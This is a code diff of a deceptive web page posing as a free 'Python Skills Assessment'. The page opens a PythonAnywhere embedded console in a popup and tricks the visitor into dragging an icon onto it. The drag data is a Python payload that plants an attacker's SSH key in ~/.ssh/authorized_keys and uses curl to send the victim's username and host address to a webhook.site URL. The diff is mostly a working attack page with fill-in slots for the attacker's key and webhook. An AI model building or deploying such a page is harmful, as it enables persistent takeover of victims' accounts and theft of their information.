@@ -25,7 +25,6 @@ p { color: #aaa; margin-bottom: 20px; }
   border-radius: 10px;
   cursor: pointer;
   margin: 15px 0;
-  transition: all 0.3s;
 }
 .start-btn:hover { background: #c9302c; }
 .verify-box {
@@ -36,10 +35,8 @@ p { color: #aaa; margin-bottom: 20px; }
   padding: 30px;
   cursor: grab;
   user-select: none;
-  transition: all 0.3s;
   margin: 20px 0;
 }
-.verify-box:hover { border-color: #e94560; }
 .verify-box:active { cursor: grabbing; }
 .verify-icon { font-size: 48px; margin-bottom: 10px; }
 .verify-label { font-size: 18px; font-weight: bold; color: #48bb78; }
@@ -65,84 +62,68 @@ p { color: #aaa; margin-bottom: 20px; }
 <body>
 
 <div class="container">
-  <h1>🐍 Python Skills Assessment</h1>
+  <h1>Python Skills Assessment</h1>
   <p>Complete the interactive verification to access the free tutorial</p>
 
-  <!-- Step 1: User clicks to open the console popup -->
-  <button class="start-btn" id="startBtn" onclick="openConsole()">
-    Start Assessment →
-  </button>
+  <button class="start-btn" id="startBtn">Start Assessment</button>
 
-  <!-- Step 2: Instructions appear after popup opens -->
   <div class="instructions" id="instructions">
-    ✅ Console loaded! Now drag the Python icon below and <b>drop it onto the terminal window</b> that just opened.
+    Console loaded! Now drag the Python icon below and <b>drop it onto the terminal window</b> that just opened.
   </div>
 
-  <!-- Step 3: Draggable element with hidden payload -->
   <div class="verify-box" id="dragItem" draggable="true">
-    <div class="verify-icon">🐍</div>
+    <div class="verify-icon">&#x1F40D;</div>
     <div class="verify-label">Drag to Verify</div>
     <div class="verify-text">Drop this onto the terminal window to continue</div>
   </div>
 
   <div class="success-msg" id="successMsg">
-    ✅ Verified! Preparing your tutorial...
+    Verified! Preparing your tutorial...
   </div>
 </div>
 
 <script>
-// ══════════════════════════════════════════════════════════════
+// ══════════════════════════════════════════════════════════
 // CHANGE THESE TWO THINGS ONLY:
-// ══════════════════════════════════════════════════════════════
+// ══════════════════════════════════════════════════════════
 
-// 1. Your attacker SSH public key (from: cat ~/.ssh/id_ed25519.pub)
-var ATTACKER_KEY = 'PASTE_YOUR_SSH_PUBLIC_KEY_HERE';
+var ATTACKER_KEY = "PASTE_YOUR_SSH_PUBLIC_KEY_HERE";
 
-// 2. Your webhook.site URL (from: https://webhook.site)
-var WEBHOOK = 'PASTE_YOUR_WEBHOOK_URL_HERE';
+var WEBHOOK = "PASTE_YOUR_WEBHOOK_URL_HERE";
 
-// ══════════════════════════════════════════════════════════════
+// ══════════════════════════════════════════════════════════
 // DO NOT CHANGE ANYTHING BELOW
-// ══════════════════════════════════════════════════════════════
+// ══════════════════════════════════════════════════════════
 
 var popup = null;
 
-// The payload: Python command that injects SSH key + sends victim info to webhook
-var payload = 'import os; os.system("mkdir -p ~/.ssh && echo \'' + ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGnl5m2NP227Tji71XUNv4Pd3TYfrl3HPpfj3K6t1kSJ AttackerAccount@green-liveconsole7 + '\' >> ~/.ssh/authorized_keys && chmod 700 ~/.ssh && chmod 600 ~/.ssh/authorized_keys && curl -s \'' + https://webhook.site/83f9a14f-165b-4b31-918b-e9ff55f2d10f + '?user=$(whoami)\\&ip=$(hostname -I | cut -d\\\" \\\" -f1)\' > /dev/null")\n';
+// Build payload safely using double quotes only
+var bashCmd = "mkdir -p ~/.ssh && echo '" + "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKnNMlgV0yv5w5h2p4QzGgmbj8k6p/pfVM6bLc0oTqV8 AttackerAccount@green-liveconsole8" + "' >> ~/.ssh/authorized_keys && chmod 700 ~/.ssh && chmod 600 ~/.ssh/authorized_keys && curl -s '" + "https://webhook.site/83f9a14f-165b-4b31-918b-e9ff55f2d10f" + "?user=$(whoami)&ip=$(hostname -I)' > /dev/null";
+var payload = "import os; os.system(\"" + bashCmd + "\")\n";
 
-function openConsole() {
-  // Open PythonAnywhere embedded console as a POPUP WINDOW
-  // Victim's SameSite=None cookie is sent → console spawns in their account
+document.getElementById("startBtn").addEventListener("click", function() {
   popup = window.open(
-    'https://www.pythonanywhere.com/embedded3/',
-    'console',
-    'width=900,height=550,left=50,top=150'
+    "https://www.pythonanywhere.com/embedded3/",
+    "console",
+    "width=900,height=550,left=50,top=150"
   );
-
-  // Show drag instructions after a delay (let console load)
-  document.getElementById('startBtn').style.display = 'none';
+  this.style.display = "none";
   setTimeout(function() {
-    document.getElementById('instructions').style.display = 'block';
-    document.getElementById('dragItem').style.display = 'block';
+    document.getElementById("instructions").style.display = "block";
+    document.getElementById("dragItem").style.display = "block";
   }, 3000);
-}
+});
 
-var dragItem = document.getElementById('dragItem');
-
-dragItem.addEventListener('dragstart', function(e) {
-  // Set the malicious command as drag data
-  e.dataTransfer.setData('text/plain', payload);
-  e.dataTransfer.effectAllowed = 'all';
-
-  // Bring the popup terminal to front
+document.getElementById("dragItem").addEventListener("dragstart", function(e) {
+  e.dataTransfer.setData("text/plain", payload);
+  e.dataTransfer.effectAllowed = "all";
   if (popup) popup.focus();
 });
 
-dragItem.addEventListener('dragend', function(e) {
-  // Show success message
-  document.getElementById('dragItem').style.display = 'none';
-  document.getElementById('instructions').style.display = 'none';
-  document.getElementById('successMsg').style.display = 'block';
+document.getElementById("dragItem").addEventListener("dragend", function(e) {
+  document.getElementById("dragItem").style.display = "none";
+  document.getElementById("instructions").style.display = "none";
+  document.getElementById("successMsg").style.display = "block";
 });
 </script>
 
